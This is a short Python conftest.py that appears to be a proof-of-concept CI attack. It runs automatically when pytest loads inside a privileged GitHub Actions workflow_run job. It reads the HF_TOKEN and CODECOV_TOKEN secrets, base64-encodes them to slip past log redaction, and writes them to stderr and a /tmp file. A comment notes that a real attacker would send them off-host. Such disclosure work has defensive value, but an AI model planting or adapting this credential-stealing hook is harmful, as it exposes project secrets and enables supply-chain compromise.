import base64
import os
import sys

# Marker so the exfil is unmistakable in logs.
MARKER = "PWNED_D_a1b2c3d4"

hf = os.environ.get("HF_TOKEN", "")
cc = os.environ.get("CODECOV_TOKEN", "")
gt_present = "yes" if os.environ.get("GITHUB_TOKEN") else "no"

# GitHub Actions redacts the literal secret value in logs, so we encode
# the secret first. base64(secret_value) is NOT in the redaction set,
# so it appears verbatim in the log -- a real attacker would POST it
# off-host; here it lands directly in the run log as proof.
hf_b64 = base64.b64encode(hf.encode()).decode() if hf else "<empty>"
cc_b64 = base64.b64encode(cc.encode()).decode() if cc else "<empty>"

# Write to stderr (pytest may capture, but assert-failure surfaces it).
sys.stderr.write(f"\n[{MARKER}] conftest.py loaded inside privileged workflow_run job\n")
sys.stderr.write(f"[{MARKER}] HF_TOKEN_b64={hf_b64}\n")
sys.stderr.write(f"[{MARKER}] CODECOV_TOKEN_b64={cc_b64}\n")
sys.stderr.write(f"[{MARKER}] GITHUB_TOKEN_present={gt_present}\n")
sys.stderr.flush()

# Stash so the failing test below can re-emit on failure.
with open("/tmp/pwned_marker", "w") as f:
    f.write(
        f"[{MARKER}] HF_b64={hf_b64} CC_b64={cc_b64} GH_present={gt_present}\n"
    )
